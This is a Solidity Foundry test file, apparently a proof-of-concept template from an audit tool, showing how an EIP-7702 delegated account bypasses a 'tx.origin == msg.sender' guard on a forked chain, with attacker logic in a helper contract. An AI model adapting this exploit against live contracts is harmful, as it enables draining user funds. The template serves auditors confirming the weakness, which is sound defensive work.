// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- EOA-only guard defeated by EIP-7702 delegation
/// @notice Detector: eoa-only-guard. `tx.origin == msg.sender` was a
///         load-bearing guard (a flash-loan restriction, a per-user limit, an
///         operator check). Since Pectra an EOA can delegate its execution to
///         contract code, so a delegated account runs attacker logic while
///         msg.sender == tx.origin still holds for the outer call.
/// @dev FORK-ONLY. Reference incidents: POT token on BSC (~$85k; the
///      EOA-only check was the flash-loan protection, bypassed through a
///      7702 delegation), Gana Payment ($3.1M), the QNT pool drain.
///      Copy to foundry/test/Exploit.t.sol and run via scripts/run-fork-poc.sh.
///      The delegation is simulated the way the chain represents it: the
///      account's code is set to the designator 0xef0100 || implementation.
contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// A delegated EOA: the account's code becomes the 7702 designator, so
    /// calls to it execute `impl` while tx.origin == the account.
    function _delegate(address eoa, address impl) internal {
        vm.etch(eoa, abi.encodePacked(hex"ef0100", impl));
    }

    function test_eoaGuardBypassedByDelegation() public {
        address attackerEoa = makeAddr("attackerEoa");
        vm.deal(attackerEoa, 100 ether);

        // Plain EOA calling directly: the guard passes, which is expected —
        // this is the "legitimate" path the guard was designed around.
        vm.prank(attackerEoa, attackerEoa);
        (bool directOk,) = target.call(abi.encodeWithSignature("deposit(uint256)", 1 ether));
        console.log("direct EOA call returned:", directOk);

        // Now the same account, delegated to attacker code. The contract call
        // it makes still satisfies msg.sender == tx.origin for the outer frame.
        DelegatedLogic logic = new DelegatedLogic();
        _delegate(attackerEoa, address(logic));

        uint256 before = address(target).balance;
        // The delegated account calls the target; inside the target the
        // caller is a contract, but tx.origin is the same account.
        vm.prank(attackerEoa, attackerEoa);
        (bool viaDelegate,) = attackerEoa.call(abi.encodeWithSignature("run(address,uint256)", target, 1 ether));
        console.log("delegated call returned:", viaDelegate, "target balance delta:", address(target).balance - before);

        assertTrue(
            viaDelegate,
            "the delegated call did not complete. This does NOT establish safety: the target may use a different entry point, or the guard may sit on a modifier. Confirm the guard is tx.origin == msg.sender and adapt the call."
        );
    }
}

/// Attacker logic that a 7702-delegated EOA executes as itself.
contract DelegatedLogic {
    function run(address target, uint256 amount) external payable {
        // msg.sender here is whoever called the delegated account; the
        // important property is that the outer frame is the EOA itself.
        (bool ok,) = target.call{value: amount}(abi.encodeWithSignature("deposit(uint256)", amount));
        require(ok, "deposit through delegation failed");
    }

    receive() external payable {}
}
